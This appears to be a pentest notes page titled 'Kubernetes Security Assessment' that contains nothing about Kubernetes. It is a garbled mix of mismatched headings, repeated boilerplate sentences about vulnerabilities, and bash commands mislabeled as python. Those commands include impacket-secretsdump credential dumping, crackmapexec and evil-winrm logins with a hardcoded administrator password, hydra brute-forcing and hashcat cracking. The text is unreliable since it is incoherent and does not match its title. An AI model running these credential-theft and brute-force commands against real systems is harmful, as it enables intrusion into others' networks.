---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, windows, malware, cheatsheet"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-938.html"
URL_IMAGES: ""
Date: "2024-05-21"
Tags: "Blue Team, Windows, Malware, Cheatsheet"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-938"
Permalink: "/notes/note-kubernetes-security-assessment-938.html"
BtnLabel: "Read Notes"
Pick: 0
---
## metasploit

### evil-winrm

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p8443,143,53 10.36.198.125 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.25.20
```

## smbexec

### Command Injection

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.100.203.96/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.76.186.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
gobuster dir -u http://10.15.78.123/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.102.210.4 -u administrator -p 'P@ssw0rd!' --shares
```

```python
crackmapexec smb 10.43.133.5 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.60.127.39 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

## nmap

### LXD Privilege Escalation

- `CSRF`
- `crackmapexec`
- `GetNPUsers`
- `msfvenom`
- `AS-REP Roasting`
- `Writable PATH`

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.161.28
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.60.86.103 -u administrator -p 'P@ssw0rd!'
```

## Windows Server 2019

### gobuster

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.195.252 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.73.148.182 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.107.192.150
```

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

- `Pass the Hash`
- `bloodhound`
- `DCSync`
- `Remote File Inclusion`
- `john`
- `Docker Escape`

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

## Open Redirect

### netcat

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

- `XXE`
- `smbexec`
- `Cron Job`
- `Local File Inclusion`

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.
